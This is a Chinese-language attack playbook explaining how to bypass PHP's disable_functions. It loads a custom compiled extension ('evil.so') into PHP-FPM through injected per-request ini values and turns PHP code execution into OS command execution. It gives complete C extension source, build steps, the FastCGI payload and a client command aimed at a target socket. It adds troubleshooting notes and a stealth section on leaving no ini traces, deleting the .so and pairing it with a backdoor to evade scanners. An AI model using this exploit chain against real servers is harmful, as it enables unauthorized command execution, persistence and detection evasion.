# disable_functions 的真正突破口：请求级加载自写扩展（.so）

> 用途：当 `disable_functions` 封了 `exec/system/shell_exec/...`，但你能①写文件 ②连到 FPM（socket 或 :9000）时，
> 用它把「PHP 代码执行」升级成**真正的 OS 命令执行**——这是原报告缺失、却决定后面能不能提权的关键一步。

## 1. 为什么别的绕法都不行，这个行

| 绕法 | 为什么在原场景失败 |
|---|---|
| `PHP_ADMIN_VALUE: disable_functions=`（置空） | worker 启动时函数已从函数表移除，ini 清空不恢复 |
| `putenv` + `LD_PRELOAD` | 需要**新进程**（`mail()`/`imap_open` 之流），且 `putenv` 常被禁；预加载只对子进程生效 |
| `FFI` / `dl()` | `ffi.enable` 默认 off、`dl()` 在多数 SAPI 被禁；且需 `extension_dir` 已有 lib |
| `imagick`/`imap_open`/`pcntl` | 依赖扩展存在，且通常已被禁或未安装（报告里已穷尽这些） |
| **`extension_dir` + `extension`（本卡路线）** | ✅ 扩展在**请求初始化阶段**由 Zend 加载，走的是模块加载逻辑，跟 PHP 函数表无关；加载后 C 层直接调 `php_exec`/`system` |

结论：**能写一个匹配版本的 `.so` + 能连 FPM = 能拿到 OS 命令**。

## 2. 三个必须匹配的条件（缺一即失败，先核对再编译）

```bash
php -i | grep -E "PHP Version|Thread Safety|PHP API|Zend Extension Build|PHP Extension Build|Architecture"
# 关注: PHP API（如 20190902 = PHP 7.4）、ZTS/NTS、x86_64、glibc 版本
uname -m; ldd --version | head -1        # 架构 + glibc（跨发行版编译要留意 glibc 下限）
```
- `PHP API` 不一致 → 加载时 `Unable to initialize module ... API=xxx` 或直接 500
- ZTS / NTS 必须一致（绝大多数 FPM 是 NTS）
- glibc 版本：在**更老的**环境编译更稳（高版本编的 so 在低版本 glibc 上跑不起来）
- 目标机没有 `php-dev`/`phpize` 时：在本地 Docker 里用**同版本**镜像编（`php:7.4-fpm` + `apt-get install -y php7.4-dev`），
  注意镜像的 glibc 版本要与目标接近

## 3. 最小扩展骨架（含一个能跑命令的导出函数）

`evil.c`:
```c
#include "php.h"
#include <stdlib.h>

PHP_FUNCTION(evil_cmd) {
    char *cmd; size_t cmd_len;
    ZEND_PARSE_PARAMETERS_START(1, 1)
        Z_PARAM_STRING(cmd, cmd_len)
    ZEND_PARSE_PARAMETERS_END();
    FILE *fp = popen(cmd, "r");            /* 这里绕开 disable_functions：C 层直接调 */
    if (!fp) { RETURN_FALSE; }
    zend_string *out = zend_string_alloc(4096, 0);
    size_t n = fread(ZSTR_VAL(out), 1, 4095, fp);
    pclose(fp);
    ZSTR_VAL(out)[n] = '\0';
    ZSTR_LEN(out) = n;
    RETURN_STR(out);
}

ZEND_BEGIN_ARG_INFO_EX(arginfo_evil_cmd, 0, 0, 1)
    ZEND_ARG_INFO(0, cmd)
ZEND_END_ARG_INFO()

static const zend_function_entry evil_functions[] = {
    PHP_FE(evil_cmd, arginfo_evil_cmd)
    PHP_FE_END
};

zend_module_entry evil_module_entry = {
    STANDARD_MODULE_HEADER, "evil", evil_functions, NULL, NULL, NULL, NULL, NULL,
    "1.0.0", STANDARD_MODULE_PROPERTIES
};
#ifdef COMPILE_DL_EVIL
ZEND_GET_MODULE(evil)
#endif
```
`config.m4`:
```m4
PHP_ARG_ENABLE(evil, whether to enable evil support, [  --enable-evil  Enable evil])
if test "$PHP_EVIL" != "no"; then
  PHP_NEW_EXTENSION(evil, evil.c, $ext_shared)
fi
```
编译：
```bash
phpize && ./configure --enable-evil && make
file modules/evil.so          # 确认 ELF x86-64
```

## 4. 投递与触发（不需要装到系统目录）

1. 把 `evil.so` 写进目标可写目录（`/tmp/`、站点 `storage/app/`、上传目录；宝塔 `open_basedir` 通常放行 `/tmp/`）
2. 用请求级 ini 让 FPM 加载它（同时仍走 `auto_prepend_file=php://input` 跑我们的 PHP）：

```
PHP_ADMIN_VALUE: open_basedir=/\nallow_url_include=On\nauto_prepend_file=php://input\nextension_dir=/tmp\nextension=evil\n
CONTENT_LENGTH: len(body)
STDIN: <?php echo evil_cmd('id');die();
```

```bash
python3 scripts/fcgi_client.py ext --target unix:///tmp/php-cgi-74.sock --script /var/www/html/index.php \
    --so-dir /tmp --so-name evil --code 'echo evil_cmd("id; uname -a");'
```
> 只在**请求级**加载，不写 `php.ini`、不重启 FPM → 站点其他请求完全不受影响，也无 ini 变更痕迹。

## 5. 失败排查

| 现象 | 原因 |
|---|---|
| `Unable to initialize module` | API 号 / ZTS 不匹配 → 换对应版本重新编译 |
| 500 且 `php-fpm.log` 有 `dlopen ... not found` | glibc 或依赖库不匹配；改在低版本镜像编译，或静态链接 |
| `PHP Warning: Module 'evil' already loaded` | 目标 php.ini 里已有同名模块 → 换名字 |
| `Call to undefined function evil_cmd()` | 扩展确实加载但函数名错（注意 `PHP_FUNCTION` 名字 vs 调用名） |
| 请求全 500 | `extension_dir` 指向了含**其它不兼容 so** 的目录 → FPM 会按目录批量加载，换干净目录 |

## 6. 隐蔽与清理

- **不落 ini**、不重启服务 → 唯一残留是磁盘上的 `.so`（用完 `unlink` 掉）
- `.so` 放 `/tmp`（重启自清）优于放站点目录（会被源码 diff 发现）
- 与 `admin-backdoor-persistence` 的框架核心注入结合：后门只负责「读/写/连 socket」，
  `.so` 现用现投 → 静态扫描看不到 `eval/system` 字样
- 若目标装了 `open_basedir` 且 `/tmp` 不在白名单 → 用 L1 先 `open_basedir=/`（同一次请求里同时给 `extension_dir` 也行）
